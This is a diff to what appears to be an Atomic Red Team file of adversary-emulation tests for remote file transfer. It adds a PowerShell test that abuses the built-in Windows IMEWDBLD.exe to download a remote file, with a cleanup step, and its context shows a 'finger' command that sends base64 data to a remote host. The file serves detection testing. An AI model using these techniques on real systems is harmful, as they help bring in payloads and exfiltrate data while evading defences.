@@ -414,3 +414,28 @@ atomic_tests:
     name: command_prompt
     command: |
       finger base64_filedata@#{remote_host}
+- name: Download a file with IMEWDBLD.exe
+  description: |
+    Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.
+    Downloaded files can be found in "%LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>" or `%LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.
+    Run "Get-ChildItem -Path C:\Users\<USERNAME>\AppData\Local\Microsoft\Windows\INetCache\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue" without quotes and adding the correct username and file name to locate the file.
+  supported_platforms:
+  - windows
+  input_arguments:
+    remote_url:
+      description: Location of file to be downloaded.
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml
+    file_name:
+      description: Name of the file to be downloaded without extension.
+      type: string
+      default: T1105
+  executor:
+    command: |
+      $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe"
+      & $imewdbled #{remote_url}
+    cleanup_command: |
+      $inetcache = $env:LOCALAPPDATA + "\Microsoft\Windows\INetCache\" 
+      $file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include T1105* -Recurse -Force -File -ErrorAction SilentlyContinue)
+      cmd.exe /c "del $file_to_be_removed"
+    name: powershell
